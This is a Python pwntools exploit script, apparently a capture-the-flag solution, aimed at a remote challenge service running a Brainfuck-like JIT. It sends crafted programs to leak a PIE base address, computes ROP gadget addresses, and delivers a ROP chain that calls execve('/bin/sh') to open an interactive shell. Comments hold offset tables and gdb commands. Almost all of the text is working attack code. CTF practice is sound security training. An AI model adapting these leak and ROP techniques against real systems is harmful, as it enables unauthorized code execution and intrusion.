#!/usr/bin/python2

from pwn import *

LOCAL = False

# LOCAL = True

if LOCAL:
	p = process('./chal')
else:
	p = remote('cha.hackpack.club', 20994)

def code_size(payload):
	sum = 0
	for i in payload:
		if i == '[' or i == ']': sum += 0xa
		elif i == '<': sum += 0x17
		elif i == ',' or i == '>': sum += 0x1d
		elif i == '.': sum += 0x25
		elif i == '+' or i == '-': assert False
		else: sum += 1
	return sum

def nop_padding(size):
	padding = ''
	while size >= 0x25:
		padding += '.'
		size -= 0x25
	while size >= 0x1d:
		padding += '>'
		size -= 0x1d
	while size >= 0x17:
		padding += '<'
		size -= 0x17
	if size: padding += '?' * size
	return padding

# context.log_level = 'debug'

payload2 = ',,,],],[>.,],[<,],[,>,]'

payload1 = nop_padding(0x11) + '[' + nop_padding(0x14) + '['

payload1 += nop_padding(code_size(payload2) + 1 - code_size(payload1))

print('code size: 0x%x' % code_size(payload2))

# raw_input()

p.recvuntil('program length: ')
p.sendline(str(len(payload1)))

p.recvuntil('program source: ')
p.send(payload1)

p.recvuntil('program length: ')
p.sendline(str(len(payload2)))

p.recvuntil('program source: ')
p.send(payload2)

p.send('\x00')
p.send('\x00')
for i in range(4):
	p.send(chr(ord('a') + i))

p.send('\x00')
p.send('1')
p.send('\x00')
for i in range(52):
	p.send(chr(ord('A') + i))

p.send('\x00')

p.send('\x00')

for i in range(87):
	p.send('2')
	p.recv(1)

s = ''
for i in range(8):
	p.send('2')
	s += p.recv(1)

p.send('\x00')

pie_offset = u64(s) - 0x10430

print('pie offset: 0x%x' % pie_offset)

pop_rdi_ret = 0x711d + pie_offset
mov_rdx_rdi_ret = 0x103F2 + pie_offset
pop_rsi_ret = 0x7285 + pie_offset
pop_rax_ret = 0x10143 + pie_offset
syscall = 0x10847 + pie_offset
buffer = 0x62078 + pie_offset
or_rax_rcx_ret = 0x41a73 + pie_offset
magic1 = 0x40512 + pie_offset
'''
add     rax, rsi
mov     [rdi+18h], rax
ret
'''
magic2 = 0x404ba + pie_offset
'''
mov rdi, qword ptr [rdi + 8]
mov rax, rdi
pop rcx
ret
'''
main_addr = 0x12560 + pie_offset

# print(hex(main_addr))

p.send('3' * 95 + '\x00')

p.send('4')

payload = p64(0) # pop rbx
payload += p64(pop_rax_ret) + p64(0) # ret
payload += p64(or_rax_rcx_ret)
payload += p64(pop_rsi_ret) + p64(0xC0)
payload += p64(pop_rdi_ret) + p64(buffer - 0x18)
payload += p64(magic1) # [buffer] = rcx + 0xC0

payload += p64(pop_rdi_ret) + p64(0)
payload += p64(mov_rdx_rdi_ret) # rdx = 0
payload += p64(pop_rsi_ret) + p64(0) # rsi = 0
payload += p64(pop_rdi_ret) + p64(buffer - 8)
payload += p64(magic2) + p64(0) # rdi = [buffer] = rcx + 0xC0
payload += p64(pop_rax_ret) + p64(59) # rax = 59
payload += p64(syscall)
payload += '/bin/sh\x00' * 10


for i in payload:
	p.send(i + '4')

p.send('\x00\x00')

p.interactive()

'''
pop_rax * 4 + pop_rcx_rax + pop_rax * 52: we set rcx to stack.
*(long long) (rcx + 88) == pie_offset + 0x10430

sizeof(.) = 0x25
sizeof(,) = 0x1d
sizeof([) = 0xa
sizeof(]) = 0xa
sizeof(>) = 0x1d
sizeof(<) = 0x17
pop_rax: offset(,) + 0x1c
pop_rcx_rax: offset(,) + 0x1b

payload1:
0x00 nop * 0x11
0x11 [
0x1b nop * 0x14
0x2f [
0x39 nop * ?

payload2:
0x00 ,0
0x1d ,1
0x3a ,2
0x57 ]3 -> 0x39 (pop_rax)
0x61 ,4
0x7e ]5 -> 0x1b (pop_rcx_rax)
0x88 ,
0xA5 [
0xAF >
0xCC .
0xF1 ,
0x10E ]
0x118 ,[<,],[,>,]
'''

'''
set disassembly-flavor intel
display /i $pc
info proc mapping
b *(0x1380E + 0x7f8a19bf4000)
'''
